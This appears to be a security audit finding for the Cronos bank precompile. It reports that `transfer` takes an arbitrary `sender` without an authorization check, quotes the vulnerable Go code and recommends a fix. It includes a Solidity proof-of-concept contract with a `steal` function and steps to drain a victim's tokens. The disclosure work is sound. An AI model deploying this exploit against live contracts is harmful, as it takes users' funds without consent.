### Title
Unauthorized Native Token Transfer via Bank Precompile `transfer` ŌĆö Arbitrary `sender` Accepted Without Authorization Check (`x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts the `sender` address directly from ABI-decoded calldata and uses it as the `from` address in `bankKeeper.SendCoins` without verifying that the calling contract is authorized to spend on behalf of that address. Any contract can call `bankPrecompile.transfer(victim, attacker, amount)` to drain `evm/<contract_address>`-denominated native tokens from any victim who holds them.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` case unpacks `sender` from the caller-supplied ABI input and passes it directly to `bankKeeper.SendCoins` as the `from` address:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
...
denom := EVMDenom(contract.Caller())  // denom is correctly tied to caller
amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

There is no check that `contract.Caller() == sender`, nor any allowance/approval mechanism. The `mint` and `burn` methods in the same precompile correctly operate only on the explicitly named `recipient` address and do not allow the caller to designate an arbitrary `from`. The `transfer` method is the sole exception.

Compare to `mint`:

```go
denom := EVMDenom(contract.Caller())
// mints to `recipient` ŌĆö no arbitrary `from` involved
``` [2](#0-1) 

The `transfer` path has no equivalent guard.

### Impact Explanation
**Critical ŌĆö Unauthorized transfer of `evm/<contract_address>` native tokens.**

A malicious contract `M` can:
1. Call `bankPrecompile.transfer(victim, attacker, amount)`.
2. The precompile computes `denom = evm/<M_address>` and calls `bankKeeper.SendCoins(victim, attacker, amount_of_evm/<M_address>)`.
3. Any balance of `evm/<M_address>` held by `victim` is transferred to `attacker` without `victim`'s consent.

Any legitimate contract that uses the bank precompile to issue `evm/<contract_address>` tokens to users is vulnerable: the contract itself (or any contract that can call the precompile with `contract.Caller()` equal to the token-issuing contract's address) can drain all holders. This is an unauthorized balance/accounting change for precompile-controlled assets, matching the Critical impact tier.

### Likelihood Explanation
The entry path is fully unprivileged. Any EVM transaction can deploy a contract and call the bank precompile's `transfer` selector with arbitrary `sender`/`recipient` arguments. No special role, key, or governance action is required. The only precondition is that the victim holds a non-zero balance of the calling contract's `evm/` denomination, which is the normal state for any user of a bank-precompile-based token.

### Recommendation
Enforce that the `sender` argument equals `contract.Caller()`, mirroring how ERC-20 `transferFrom` requires either `src == msg.sender` or a valid allowance:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("transfer: sender must be the calling contract")
    }
    ...
```

Alternatively, remove the `sender` parameter entirely and always use `contract.Caller()` as the `from` address, consistent with how `mint`/`burn` are implemented.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function balanceOf(address token, address addr) external view returns (uint256);
}

contract Exploit {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64)); // bank precompile

    // Step 1: mint evm/<this> tokens to victim (simulating a legitimate token distribution)
    function mintToVictim(address victim, uint256 amount) external payable {
        bank.mint{value: msg.value}(victim, amount);
    }

    // Step 2: steal victim's evm/<this> tokens without any approval
    function steal(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract ŌĆö no authorization check
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `Exploit`.
2. Call `mintToVictim(victim, 1000)` ŌĆö victim now holds 1000 `evm/<Exploit_address>` tokens.
3. Call `steal(victim, attacker, 1000)` ŌĆö the bank precompile transfers 1000 tokens from `victim` to `attacker` with no approval from `victim`.
4. `bank.balanceOf(Exploit_address, victim)` returns 0; `bank.balanceOf(Exploit_address, attacker)` returns 1000. [3](#0-2)
